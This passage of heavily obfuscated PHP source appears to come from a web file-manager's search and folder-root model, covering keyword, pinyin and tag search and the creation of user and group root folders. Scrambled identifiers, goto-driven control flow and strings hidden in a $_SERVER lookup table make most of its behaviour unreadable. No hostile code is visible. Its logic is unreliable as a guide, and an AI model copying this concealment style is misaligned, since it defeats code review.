listSearch($Bº†×¯»æ•, $Eİù´Â‰ß = 300) { goto fªóÄÍˆÃˆ; BîÛ·ëÃ²ù: $E‰‚”ñ‰Àë = $this->distinct(!0)->field($bŒçÌ„¡ó¥)->where($Dµœ‹âù•)->selectPage($Eİù´Â‰ß); $this->_listSearchDesc($E‰‚”ñ‰Àë, $Bº†×¯»æ•, $eŠ„ëˆ‰Óˆ); $this->_listSearchTag($E‰‚”ñ‰Àë, $Bº†×¯»æ•, $eŠ„ëˆ‰Óˆ); goto dÆĞ›Òâ›ï; AÖå‚¦¸îá: return $E‰‚”ñ‰Àë; goto A“†Õ„°İ‚; BÊ†…ÚĞ¦: if (!isset($Dµœ‹âù•[$bŠŞäæ­ñ¨[417]])) { $Dµœ‹âù•[$bŠŞäæ­ñ¨[417]] = 0; } $bŒçÌ„¡ó¥ = $bŠŞäæ­ñ¨[1906]; $eŠ„ëˆ‰Óˆ = $bŒçÌ„¡ó¥; goto Aê‘†ç‹ïî; Aê‘†ç‹ïî: $this->_listSearchBindPinyin($Bº†×¯»æ•, $Dµœ‹âù•, $bŒçÌ„¡ó¥); $this->alias($bŠŞäæ­ñ¨[511])->_makeOrder(); $Dµœ‹âù• = $this->parseWhereLike($Dµœ‹âù•); goto BîÛ·ëÃ²ù; dÆĞ›Òâ›ï: $this->_listSearchGroupTag($E‰‚”ñ‰Àë, $Bº†×¯»æ•, $eŠ„ëˆ‰Óˆ); $this->_listDataApply($E‰‚”ñ‰Àë[$bŠŞäæ­ñ¨[365]]); $this->_listMake($E‰‚”ñ‰Àë); goto AÖå‚¦¸îá; fªóÄÍˆÃˆ: $bŠŞäæ­ñ¨ =& $_SERVER[Š‰]; if (isset($Bº†×¯»æ•[$bŠŞäæ­ñ¨[1747]]) && $Bº†×¯»æ•[$bŠŞäæ­ñ¨[1747]]) { $Bº†×¯»æ•[$bŠŞäæ­ñ¨[1747]] = str_replace($bŠŞäæ­ñ¨[379], $bŠŞäæ­ñ¨[1905], trim($Bº†×¯»æ•[$bŠŞäæ­ñ¨[1747]])); } $Dµœ‹âù• = $this->_parseSearchWhere($Bº†×¯»æ•); goto BÊ†…ÚĞ¦; A“†Õ„°İ‚: } private function _listSearchTag(&$fï•”çˆ£Š, $FÓ¯“ïÛ¼, $eˆºô­İÀ) { goto c…Æ¾²å†; c…Æ¾²å†: $e¿éÁ¶®ŠÇ =& $_SERVER[Š‰]; if (!$FÓ¯“ïÛ¼[$e¿éÁ¶®ŠÇ[1747]] || $fï•”çˆ£Š[$e¿éÁ¶®ŠÇ[362]][$e¿éÁ¶®ŠÇ[349]] > 1) { return; } $A—ğÖéù¿¾ = Model($e¿éÁ¶®ŠÇ[1907])->listData(); goto a®‹×‡‚; DÃì¼ŞªÚ”: $cˆ×µ‰ÄÒŞ = array_to_keyvalue($cˆ×µ‰ÄÒŞ, $e¿éÁ¶®ŠÇ[33], $e¿éÁ¶®ŠÇ[75]); $AØŸÀî—È« = array_unique($cˆ×µ‰ÄÒŞ); $this->_listSearchMerge($fï•”çˆ£Š, $FÓ¯“ïÛ¼, $eˆºô­İÀ, $AØŸÀî—È«); goto Bñ„—–áäê; dÆ´ãßÉ§: if (!$bŸ¼í¡•è) { return; } $eŒéöæá™¢ = array($e¿éÁ¶®ŠÇ[413] => array($e¿éÁ¶®ŠÇ[7], $bŸ¼í¡•è), $e¿éÁ¶®ŠÇ[1500] => USER_ID); $cˆ×µ‰ÄÒŞ = Model($e¿éÁ¶®ŠÇ[414])->field($e¿éÁ¶®ŠÇ[75])->where($eŒéöæá™¢)->select(); goto DÃì¼ŞªÚ”; a®‹×‡‚: $bŸ¼í¡•è = array(); $BãÈÔ¿…ëù = $FÓ¯“ïÛ¼[$e¿éÁ¶®ŠÇ[1747]]; foreach ($A—ğÖéù¿¾ as $f½¦ƒç¦Ğ¬) { $Eå¿¦ïÎ†î = $f½¦ƒç¦Ğ¬[$e¿éÁ¶®ŠÇ[28]]; $C©¸¼‹‰‹Ç = str_replace($e¿éÁ¶®ŠÇ[50], $e¿éÁ¶®ŠÇ[33], Pinyin::encode($Eå¿¦ïÎ†î)); if (stripos($Eå¿¦ïÎ†î, $BãÈÔ¿…ëù) !== !1 || stripos($C©¸¼‹‰‹Ç, $BãÈÔ¿…ëù) !== !1) { $bŸ¼í¡•è[] = $f½¦ƒç¦Ğ¬[$e¿éÁ¶®ŠÇ[388]]; } } goto dÆ´ãßÉ§; Bñ„—–áäê: } private function _listSearchDesc(&$C¬§–œœĞã, $bŒŠ«†Ó˜ˆ, $aÊ»Æ¯ÜÍ) { goto DšˆÍÌÄªô; cßã¢äè†Ü: $DùÔ¨¸¡Ú = Model($fª‘Ğ›Ä‡[527])->field($fª‘Ğ›Ä‡[390])->where($f¡ÛÈ¯¹É•)->select(); $dÒ¸ŸÑ¹” = array_to_keyvalue($DùÔ¨¸¡Ú, $fª‘Ğ›Ä‡[33], $fª‘Ğ›Ä‡[390]); $this->_listSearchMerge($C¬§–œœĞã, $bŒŠ«†Ó˜ˆ, $aÊ»Æ¯ÜÍ, $dÒ¸ŸÑ¹”); goto A‡ Ø„œÅğ; DšˆÍÌÄªô: $fª‘Ğ›Ä‡ =& $_SERVER[Š‰]; if (!$bŒŠ«†Ó˜ˆ[$fª‘Ğ›Ä‡[1747]] || $C¬§–œœĞã[$fª‘Ğ›Ä‡[362]][$fª‘Ğ›Ä‡[349]] > 1) { return; } $EäøØœÑœ = $this->listSearchChildren($bŒŠ«†Ó˜ˆ[$fª‘Ğ›Ä‡[472]]); goto e¹’ä¹¿Ø; e¹’ä¹¿Ø: $EäøØœÑœ = array_unique($EäøØœÑœ); if (!$EäøØœÑœ) { return; } $f¡ÛÈ¯¹É• = array($fª‘Ğ›Ä‡[390] => array($fª‘Ğ›Ä‡[7], $EäøØœÑœ), $fª‘Ğ›Ä‡[92] => $fª‘Ğ›Ä‡[425], $fª‘Ğ›Ä‡[370] => array($fª‘Ğ›Ä‡[378], $fª‘Ğ›Ä‡[1749] . $bŒŠ«†Ó˜ˆ[$fª‘Ğ›Ä‡[1747]] . $fª‘Ğ›Ä‡[1749])); goto cßã¢äè†Ü; A‡ Ø„œÅğ: } private function _listSearchGroupTag(&$EŞØèˆÌÅÜ, $FÄÓª‚Åñ‹, $bÃ¯ç½©–Ğ) { goto d°¸İÎÉóœ; fçØ“¶¬‹”: if (!$E©–‹Á‘) { return; } $aòäØæºÅæ = array($f˜‰Ø³ïì³[413] => array($f˜‰Ø³ïì³[7], $E©–‹Á‘), $f˜‰Ø³ïì³[1500] => 0, $f˜‰Ø³ïì³[29] => $f˜‰Ø³ïì³[1771] . $DÊùŞÅìå); $FÏÚœ¶ª® = Model($f˜‰Ø³ïì³[414])->field($f˜‰Ø³ïì³[75])->where($aòäØæºÅæ)->select(); goto A‘Ş´¶²õ; b¡òÜ„õ×: if (!$EêñÏäŒäö || $EêñÏäŒäö[$f˜‰Ø³ïì³[398]] != SourceModel::TYPE_GROUP) { return; } $DÊùŞÅìå = $EêñÏäŒäö[$f˜‰Ø³ïì³[478]]; $bã–ÕµùÏ¿ = Model($f˜‰Ø³ïì³[1908])->get($DÊùŞÅìå); goto f‹ù™„ÄÌÖ; f‹ù™„ÄÌÖ: $E©–‹Á‘ = array(); $b©®Ÿõ«ë¬ = $FÄÓª‚Åñ‹[$f˜‰Ø³ïì³[1747]]; foreach ($bã–ÕµùÏ¿[$f˜‰Ø³ïì³[365]] as $C½¼å§²) { $cë‘àŞİÌ = $C½¼å§²[$f˜‰Ø³ïì³[28]]; $D¡‡šàğ = str_replace($f˜‰Ø³ïì³[50], $f˜‰Ø³ïì³[33], Pinyin::encode($cë‘àŞİÌ)); if (stripos($cë‘àŞİÌ, $b©®Ÿõ«ë¬) !== !1 || stripos($D¡‡šàğ, $b©®Ÿõ«ë¬) !== !1) { $E©–‹Á‘[] = $C½¼å§²[$f˜‰Ø³ïì³[388]]; } } goto fçØ“¶¬‹”; A‘Ş´¶²õ: $FÏÚœ¶ª® = array_to_keyvalue($FÏÚœ¶ª®, $f˜‰Ø³ïì³[33], $f˜‰Ø³ïì³[75]); $Dñø–àŞ–Ñ = array_unique($FÏÚœ¶ª®); $this->_listSearchMerge($EŞØèˆÌÅÜ, $FÄÓª‚Åñ‹, $bÃ¯ç½©–Ğ, $Dñø–àŞ–Ñ); goto AÜÇÓ†ö¾; d°¸İÎÉóœ: $f˜‰Ø³ïì³ =& $_SERVER[Š‰]; if (!$FÄÓª‚Åñ‹[$f˜‰Ø³ïì³[1747]] || $EŞØèˆÌÅÜ[$f˜‰Ø³ïì³[362]][$f˜‰Ø³ïì³[349]] > 1 || !$FÄÓª‚Åñ‹[$f˜‰Ø³ïì³[472]]) { return; } $EêñÏäŒäö = $this->sourceInfo($FÄÓª‚Åñ‹[$f˜‰Ø³ïì³[472]]); goto b¡òÜ„õ×; AÜÇÓ†ö¾: } private function _listSearchMerge(&$BÛÖ°æé‡¨, $C¹½Ú «‘Ò, $eƒóÑëËª‡, $dŠŞä°ÄÇ–) { goto B§œ³‘…¿³; E’áŒƒÑ«: foreach ($A˜•·“à™ as $CëÍŞ“·‰å) { if ($this->_listSearchFilter($CëÍŞ“·‰å, $C¹½Ú «‘Ò)) { $c’ğ™ãÏÑ[] = $CëÍŞ“·‰å; } } $BÛÖ°æé‡¨[$f´ó÷ Ò÷“[365]] = array_merge($c’ğ™ãÏÑ, $BÛÖ°æé‡¨[$f´ó÷ Ò÷“[365]]); $BÛÖ°æé‡¨[$f´ó÷ Ò÷“[362]][$f´ó÷ Ò÷“[363]] += count($c’ğ™ãÏÑ); goto cİë¨¸‹™Â; FæøÏáò¹¶: $A˜•·“à™ = $this->field($eƒóÑëËª‡)->where($C¼¬öÓåÖ†)->select(); if (!$A˜•·“à™) { return; } $c’ğ™ãÏÑ = array(); goto E’áŒƒÑ«; B£—–²Ò¾: $AßÅÓ’£—É = array_diff($dŠŞä°ÄÇ–, $bÁ¿‚§Ò¡Ï); if (!$AßÅÓ’£—É) { return; } $C¼¬öÓåÖ† = array($f´ó÷ Ò÷“[390] => array($f´ó÷ Ò÷“[7], $AßÅÓ’£—É)); goto FæøÏáò¹¶; B§œ³‘…¿³: $f´ó÷ Ò÷“ =& $_SERVER[Š‰]; if (!$dŠŞä°ÄÇ–) { return; } $bÁ¿‚§Ò¡Ï = array_to_keyvalue($BÛÖ°æé‡¨[$f´ó÷ Ò÷“[365]], $f´ó÷ Ò÷“[33], $f´ó÷ Ò÷“[390]); goto B£—–²Ò¾; cİë¨¸‹™Â: } private function _listSearchFilter($CšŒ·ÜŠì…, $FÄğ¦ô¨Éœ) { goto FÇæ««Æ; eíÆ®¾äÑ°: if (isset($FÄğ¦ô¨Éœ[$aÉôÒ·ã[557]]) && $FÄğ¦ô¨Éœ[$aÉôÒ·ã[557]] != $CšŒ·ÜŠì…[$aÉôÒ·ã[428]]) { return !1; } return !0; goto F¯Ø¬ÂÁöø; FÇæ««Æ: $aÉôÒ·ã =& $_SERVER[Š‰]; $eÔí¦ó›®Õ = $CšŒ·ÜŠì…[$aÉôÒ·ã[397]] == $aÉôÒ·ã[86]; if (!strstr($CšŒ·ÜŠì…[$aÉôÒ·ã[481]], $aÉôÒ·ã[47] . $FÄğ¦ô¨Éœ[$aÉôÒ·ã[472]] . $aÉôÒ·ã[47])) { return !1; } goto Dùäß”·¤µ; Dùäß”·¤µ: if (isset($FÄğ¦ô¨Éœ[$aÉôÒ·ã[399]]) && $FÄğ¦ô¨Éœ[$aÉôÒ·ã[399]] != $aÉôÒ·ã[1714]) { if ($FÄğ¦ô¨Éœ[$aÉôÒ·ã[399]] == $aÉôÒ·ã[76] && !$eÔí¦ó›®Õ) { return !1; } if ($FÄğ¦ô¨Éœ[$aÉôÒ·ã[399]] != $aÉôÒ·ã[76] && $eÔí¦ó›®Õ) { return !1; } if (!strstr($CšŒ·ÜŠì…[$aÉôÒ·ã[167]], $aÉôÒ·ã[47] . $FÄğ¦ô¨Éœ[$aÉôÒ·ã[399]] . $aÉôÒ·ã[47])) { return !1; } } if (isset($FÄğ¦ô¨Éœ[$aÉôÒ·ã[1909]]) && $FÄğ¦ô¨Éœ[$aÉôÒ·ã[1909]] < $CšŒ·ÜŠì…[$aÉôÒ·ã[77]]) { return !1; } if (isset($FÄğ¦ô¨Éœ[$aÉôÒ·ã[1910]]) && $FÄğ¦ô¨Éœ[$aÉôÒ·ã[1910]] > $CšŒ·ÜŠì…[$aÉôÒ·ã[77]]) { return !1; } goto eíÆ®¾äÑ°; F¯Ø¬ÂÁöø: } public function listSearchChildren($bƒÓ«ˆ­¢Å, $eÈÉé©öÉĞ = 5000) { goto ağ˜Åßòø; E…«Á¸ß‰: $C×Üœó°ˆí = array($E„Ïâøì‹¤[481] => array($E„Ïâøì‹¤[378], $FëÜôœ÷ùó[$E„Ïâøì‹¤[481]] . $FëÜôœ÷ùó[$E„Ïâøì‹¤[390]] . $E„Ïâøì‹¤[508])); $aöÒËÏ¦ì° = $this->field($E„Ïâøì‹¤[390])->cache(null, 600)->where($C×Üœó°ˆí)->count(); if ($aöÒËÏ¦ì° > $eÈÉé©öÉĞ) { return $this->_listSearchChildrenNear($bƒÓ«ˆ­¢Å, $eÈÉé©öÉĞ); } goto E®ƒ÷œŸÁ†; E®ƒ÷œŸÁ†: $DùˆÏÚßÇ = $this->field($E„Ïâøì‹¤[390])->where($C×Üœó°ˆí)->select(); $DÜ§šğë¶ = array_to_keyvalue($DùˆÏÚßÇ, $E„Ïâøì‹¤[33], $E„Ïâøì‹¤[390]); return $DÜ§šğë¶; goto Dæª¹¯³ ; ağ˜Åßòø: $E„Ïâøì‹¤ =& $_SERVER[Š‰]; $DÜ§šğë¶ = array(); $FëÜôœ÷ùó = $this->sourceInfo($bƒÓ«ˆ­¢Å); goto E…«Á¸ß‰; Dæª¹¯³ : } private function _listSearchChildrenNear($f³ÈÀÀÃŸ, $FÌô¦˜Ÿ˜î) { goto c³«ÅŸç«®; c³«ÅŸç«®: $Bİğ³çáÄ• =& $_SERVER[Š‰]; $dÌÒ¾ñÆ£ã = array(); $fñ­–åë = array($Bİğ³çáÄ•[472] => $f³ÈÀÀÃŸ); goto cÏÆˆ°Ô×; F÷Ñ¡§Ğõù: $dÌÒ¾ñÆ£ã = array_merge($dÌÒ¾ñÆ£ã, array_to_keyvalue($BÙÀøÅèªù, $Bİğ³çáÄ•[33], $Bİğ³çáÄ•[390])); $dÌÒ¾ñÆ£ã = array_slice($dÌÒ¾ñÆ£ã, 0, $FÌô¦˜Ÿ˜î); return $dÌÒ¾ñÆ£ã; goto Có‡ˆƒùò³; cÏÆˆ°Ô×: $BÙÀøÅèªù = $this->field($Bİğ³çáÄ•[1911])->where($fñ­–åë)->select(); $C‚‰’„¾É = array_to_keyvalue(array_filter_by_field($BÙÀøÅèªù, $Bİğ³çáÄ•[397], $Bİğ³çáÄ•[86]), $Bİğ³çáÄ•[33], $Bİğ³çáÄ•[390]); $dÌÒ¾ñÆ£ã = array_merge($dÌÒ¾ñÆ£ã, array_to_keyvalue($BÙÀøÅèªù, $Bİğ³çáÄ•[33], $Bİğ³çáÄ•[390])); goto aÛÄé±«©¥; aÛÄé±«©¥: if (!$C‚‰’„¾É) { return $dÌÒ¾ñÆ£ã; } $fñ­–åë = array($Bİğ³çáÄ•[472] => array($Bİğ³çáÄ•[7], $C‚‰’„¾É)); $BÙÀøÅèªù = $this->field($Bİğ³çáÄ•[1911])->where($fñ­–åë)->limit($FÌô¦˜Ÿ˜î)->select(); goto F÷Ñ¡§Ğõù; Có‡ˆƒùò³: } private function _listSearchBindPinyin($C„Ë¸ŸÚ‚, &$cŠÇ…Õ÷, &$c¹¿Ê´£µé) { goto DùË³…ÔÊ«; c×Š¨øŸùº: $cŠÇ…Õ÷ = $B½¢¸®¡²›; goto eƒİ¬ô£»â; B£åˆïòå±: $AÎˆŸËèœ¨ = "\x4c\105\x46\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\157\x5f\x73\157\x75\x72\x63\x65\137\155\145\164\141\40\155\x65\164\141\x20\157\156\x20\x73\x6f\x75\x72\143\x65\x2e\x73\157\x75\x72\x63\145\x49\x44\x20\x3d\x20\x6d\145\164\x61\56\x73\x6f\165\x72\x63\x65\111\x44"; $B½¢¸®¡²› = array(); $c¹¿Ê´£µé = str_replace(array($dÊÛ§ùŠØä[227], $dÊÛ§ùŠØä[50], $dÊÛ§ùŠØä[1912]), $dÊÛ§ùŠØä[33], $c¹¿Ê´£µé); goto A„ÃŞ¤À Ş; Cœ£Ñêö: foreach ($cŠÇ…Õ÷ as $eÂç°§°ğ => $f”šÒ°¾) { $B½¢¸®¡²›[$dÊÛ§ùŠØä[1913] . $eÂç°§°ğ] = $f”šÒ°¾; } foreach ($F„”ñÏ‚’ as $cŸÎ£Şí­ö) { $B½¢¸®¡²›[] = array($dÊÛ§ùŠØä[1915] => $cŸÎ£Şí­ö, $dÊÛ§ùŠØä[934] => $dÊÛ§ùŠØä[1751], array($dÊÛ§ùŠØä[1916] => $cŸÎ£Şí­ö, $dÊÛ§ùŠØä[1917] => array($dÊÛ§ùŠØä[7], array($dÊÛ§ùŠØä[438], $dÊÛ§ùŠØä[437])))); } $this->join($AÎˆŸËèœ¨); goto c×Š¨øŸùº; DùË³…ÔÊ«: $dÊÛ§ùŠØä =& $_SERVER[Š‰]; if (!isset($C„Ë¸ŸÚ‚[$dÊÛ§ùŠØä[1747]]) || !$C„Ë¸ŸÚ‚[$dÊÛ§ùŠØä[1747]]) { return; } if (!Input::check($C„Ë¸ŸÚ‚[$dÊÛ§ùŠØä[1747]], $dÊÛ§ùŠØä[314]) || strlen($C„Ë¸ŸÚ‚[$dÊÛ§ùŠØä[1747]]) < 2) { return; } goto B£åˆïòå±; A„ÃŞ¤À Ş: $c¹¿Ê´£µé = $dÊÛ§ùŠØä[1913] . str_replace($dÊÛ§ùŠØä[47], $dÊÛ§ùŠØä[1914], $c¹¿Ê´£µé); $F„”ñÏ‚’ = $cŠÇ…Õ÷[$dÊÛ§ùŠØä[28]]; unset($cŠÇ…Õ÷[$dÊÛ§ùŠØä[28]]); goto Cœ£Ñêö; eƒİ¬ô£»â: } private function _parseSearchWhere($bí”Éåïöã) { goto cöŞÅ«½ò¥; cÈ»Ë…™Ê: if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[557]]) && $bí”Éåïöã[$aÂÌ©½Æ‚İ[557]]) { $eœ¸£Ï—Ú[] = array($aÂÌ©½Æ‚İ[428] => $bí”Éåïöã[$aÂÌ©½Æ‚İ[557]], $aÂÌ©½Æ‚İ[426] => $bí”Éåïöã[$aÂÌ©½Æ‚İ[557]], $aÂÌ©½Æ‚İ[934] => $aÂÌ©½Æ‚İ[1751]); } if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[399]]) && $bí”Éåïöã[$aÂÌ©½Æ‚İ[399]]) { $d‘™¹áõ›‡ = $bí”Éåïöã[$aÂÌ©½Æ‚İ[399]]; if ($d‘™¹áõ›‡ == $aÂÌ©½Æ‚İ[76]) { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[397]] = 1; } else { if ($d‘™¹áõ›‡ == $aÂÌ©½Æ‚İ[1921]) { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[397]] = 0; } else { if ($d‘™¹áõ›‡) { $d‘™¹áõ›‡ = is_array($d‘™¹áõ›‡) ? $d‘™¹áõ›‡ : explode($aÂÌ©½Æ‚İ[47], $d‘™¹áõ›‡); $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[399]] = array($aÂÌ©½Æ‚İ[405], $d‘™¹áõ›‡); $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[397]] = 0; } } } } if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[472]]) && $bí”Éåïöã[$aÂÌ©½Æ‚İ[472]]) { $Eì‹ÌŒòİŠ = $this->sourceInfo($bí”Éåïöã[$aÂÌ©½Æ‚İ[472]]); $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[548]] = array($aÂÌ©½Æ‚İ[507], $Eì‹ÌŒòİŠ[$aÂÌ©½Æ‚İ[481]] . $bí”Éåïöã[$aÂÌ©½Æ‚İ[472]] . $aÂÌ©½Æ‚İ[508]); } goto A‡¦ïßŠœ˜; A‡¦ïßŠœ˜: if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[1747]]) && trim($bí”Éåïöã[$aÂÌ©½Æ‚İ[1747]])) { $C°á¯òµ = trim($bí”Éåïöã[$aÂÌ©½Æ‚İ[1747]]); $DïÈË®‹Şí = explode($aÂÌ©½Æ‚İ[50], $C°á¯òµ); if (strlen($C°á¯òµ) > 2 && (substr($C°á¯òµ, 0, 1) == $aÂÌ©½Æ‚İ[115] && substr($C°á¯òµ, -1) == $aÂÌ©½Æ‚İ[115]) || substr($C°á¯òµ, 0, 1) == $aÂÌ©½Æ‚İ[55] && substr($C°á¯òµ, -1) == $aÂÌ©½Æ‚İ[55]) { $C°á¯òµ = substr($C°á¯òµ, 1, -1); $DïÈË®‹Şí = array($C°á¯òµ); } $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[28]] = array(array($aÂÌ©½Æ‚İ[507], $aÂÌ©½Æ‚İ[1749] . $C°á¯òµ . $aÂÌ©½Æ‚İ[1749])); if (count($DïÈË®‹Şí) > 1) { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[28]] = array(); foreach ($DïÈË®‹Şí as $fìŞŞŒ±áÒ) { if (!trim($fìŞŞŒ±áÒ)) { continue; } $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[28]][] = array($aÂÌ©½Æ‚İ[507], $aÂÌ©½Æ‚İ[1749] . trim($fìŞŞŒ±áÒ) . $aÂÌ©½Æ‚İ[1749]); } } } return $eœ¸£Ï—Ú; goto fë»™ñÍ×õ; cöŞÅ«½ò¥: $aÂÌ©½Æ‚İ =& $_SERVER[Š‰]; $eœ¸£Ï—Ú = array(); if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[715]]) && $bí”Éåïöã[$aÂÌ©½Æ‚İ[715]]) { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[83]] = array($aÂÌ©½Æ‚İ[1918], $bí”Éåïöã[$aÂÌ©½Æ‚İ[715]]); } goto d½ƒ…¨•“ë; d½ƒ…¨•“ë: if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[470]]) && $bí”Éåïöã[$aÂÌ©½Æ‚İ[470]]) { $a‘°í«¥§ = array($aÂÌ©½Æ‚İ[1919], $bí”Éåïöã[$aÂÌ©½Æ‚İ[470]]); if ($eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[83]]) { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[83]] = array($eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[83]], $a‘°í«¥§, $aÂÌ©½Æ‚İ[1920]); } else { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[83]] = $a‘°í«¥§; } } if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[1909]]) && $bí”Éåïöã[$aÂÌ©½Æ‚İ[1909]] > 0) { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[77]] = array($aÂÌ©½Æ‚İ[1918], $bí”Éåïöã[$aÂÌ©½Æ‚İ[1909]]); } if (isset($bí”Éåïöã[$aÂÌ©½Æ‚İ[1910]]) && $bí”Éåïöã[$aÂÌ©½Æ‚İ[1910]]) { $a‘°í«¥§ = array($aÂÌ©½Æ‚İ[1919], $bí”Éåïöã[$aÂÌ©½Æ‚İ[1910]]); if ($eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[77]]) { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[77]] = array($eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[77]], $a‘°í«¥§, $aÂÌ©½Æ‚İ[1920]); } else { $eœ¸£Ï—Ú[$aÂÌ©½Æ‚İ[77]] = $a‘°í«¥§; } } goto cÈ»Ë…™Ê; fë»™ñÍ×õ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($d‰¦¨Åö²á) { $dÅÀ”›ë‰¥ =& $_SERVER[Š‰]; $bœİ† ÄÈì = Model($dÅÀ”›ë‰¥[497])->where(array($dÅÀ”›ë‰¥[1492] => $d‰¦¨Åö²á))->find(); $eŠŠæ«Æ­  = $this->_mkdirRoot(SourceModel::TYPE_USER, $d‰¦¨Åö²á, $bœİ† ÄÈì[$dÅÀ”›ë‰¥[28]]); $this->userDesktopAdd($eŠŠæ«Æ­ ); return $eŠŠæ«Æ­ ; } public function userDesktopAdd($bÁ®‹…˜¡) { $b¬ë˜£¡Ï© =& $_SERVER[Š‰]; $B•Æˆ‹½È² = LNG($b¬ë˜£¡Ï©[1922]); $D¨é×ŸÑŸ = $this->mkdir($bÁ®‹…˜¡, $B•Æˆ‹½È²); $this->metaSet($D¨é×ŸÑŸ, $b¬ë˜£¡Ï©[1923], $b¬ë˜£¡Ï©[86]); $this->metaSet($bÁ®‹…˜¡, $b¬ë˜£¡Ï©[1924], $D¨é×ŸÑŸ); } public function groupRootAdd($Aí…Úä­Âê) { $Aãç¡òöÊÜ =& $_SERVER[Š‰]; $A¢Ä¯©Æ”ï = Model($Aãç¡òöÊÜ[480])->where(array($Aãç¡òöÊÜ[1742] => $Aí…Úä­Âê))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Aí…Úä­Âê, $A¢Ä¯©Æ”ï[$Aãç¡òöÊÜ[28]]); } public function systemRootPathAdd($bé¤—î™Ò) { if ($bé¤—î™Ò != $_SERVER[Š‰][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $bé¤—î™Ò); } public function userRootRemove($FÑòØì“×Ğ) { $dëó÷“‰éˆ = $this->sourceRoot(SourceModel::TYPE_USER, $FÑòØì“×Ğ); if (!$dëó÷“‰éˆ) { return; } $this->remove($dëó÷“‰éˆ, !1); } public function groupRootRemove($e¬ÖŸÃ·ê) { $Aä³Àëä¶ = $this->sourceRoot(SourceModel::TYPE_GROUP, $e¬ÖŸÃ·ê); if (!$Aä³Àëä¶) { return; } $this->remove($Aä³Àëä¶, !1); } private function _mkdirRoot($f•Ö­Ë•¼ù, $fÛµæö’Ş, $D“¹æˆ‹Şİ) { goto fË´˜ƒÛñƒ; D„ŠâÎ‰…„: $Dªö´ëæ‘± = $this->add($CàÉ‰êÀƒ); $C¿å•Ùé˜µ = array($aÌèêù§ªŞ[550] => short_id($Dªö´ëæ‘±)); $this->where(array($aÌèêù§ªŞ[404] => $Dªö´ëæ‘±))->save($C¿å•Ùé˜µ); goto c‹ßµ°…ğ«; f­¬×Øâ: $AÁ‘ÊÙîÁÒ = "\x4d\157\x64\x65\154\123\x6f\x75\162\143\x65\56\x6d\x6b\144\x69\x72\x52\x6f\157\164\x2e{$f•Ö­Ë•¼ù}\56{$fÛµæö’Ş}\x2e" . $D“¹æˆ‹Şİ; CacheLock::lock($AÁ‘ÊÙîÁÒ); $CàÉ‰êÀƒ[$aÌèêù§ªŞ[28]] = $D“¹æˆ‹Şİ; goto D„ŠâÎ‰…„; fË´˜ƒÛñƒ: $aÌèêù§ªŞ =& $_SERVER[Š‰]; $CàÉ‰êÀƒ = array($aÌèêù§ªŞ[389] => 0, $aÌèêù§ªŞ[544] => $f•Ö­Ë•¼ù, $aÌèêù§ªŞ[545] => $fÛµæö’Ş, $aÌèêù§ªŞ[541] => 1, $aÌèêù§ªŞ[546] => USER_ID, $aÌèêù§ªŞ[547] => USER_ID, $aÌèêù§ªŞ[542] => $aÌèêù§ªŞ[33], $aÌèêù§ªŞ[548] => $aÌèêù§ªŞ[493], $aÌèêù§ªŞ[416] => 0, $aÌèêù§ªŞ[543] => 0, $aÌèêù§ªŞ[442] => 0, $aÌèêù§ªŞ[549] => $aÌèêù§ªŞ[33]); if ($c´„ò…« = $this->where($CàÉ‰êÀƒ)->find()) { return $c´„ò…«[$aÌèêù§ªŞ[390]]; } goto f­¬×Øâ; c‹ßµ°…ğ«: CacheLock::unlock($AÁ‘ÊÙîÁÒ); return $Dªö´ëæ‘±; goto dÇµØ¨ÕÚ; dÇµØ¨ÕÚ: } private function sourceRoot($eùÁ‰“Åƒ, $e¸•Ä¨Ò±¤, $cÂÈÛ½äŠŒ = false) { $bˆƒ¶íñâ£ =& $_SERVER[Š‰]; $DˆŠ³´ø… = array($bˆƒ¶íñâ£[389] => 0, $bˆƒ¶íñâ£[544] => $eùÁ‰“Åƒ, $bˆƒ¶íñâ£[545] => $e¸•Ä¨Ò±¤); if ($D¨»Ï¿ªæñ = $this->where($DˆŠ³´ø…)->find()) { return $cÂÈÛ½äŠŒ ? $D¨»Ï¿ªæñ : $D¨»Ï¿ªæñ[$bˆƒ¶íñâ£[390]]; } return !1; } public function sourceRootGroup($dÊ‚…ÜäÌé) { goto bÁ†Ÿ“¾ÆÜ; C¿ÜÓ±Òâã: return array_to_keyvalue($bôÅåâµ†’[$DãÓ®·°ç[74]], $DãÓ®·°ç[478]); goto AµÏŸÎ·; D¶“Ï³÷: $this->selectPageReset(); $bôÅåâµ†’ = $this->listSource($d³‰—åøÏè, 1000); $this->selectPageRestore(); goto C¿ÜÓ±Òâã; bÁ†Ÿ“¾ÆÜ: $DãÓ®·°ç =& $_SERVER[Š‰]; if (is_string($dÊ‚…ÜäÌé)) { $dÊ‚…ÜäÌé = array($dÊ‚…ÜäÌé); } $d³‰—åøÏè = array($DãÓ®·°ç[389] => 0, $DãÓ®·°ç[544] => SourceModel::TYPE_GROUP, $DãÓ®·°ç[545] => array($DãÓ®·°ç[7], 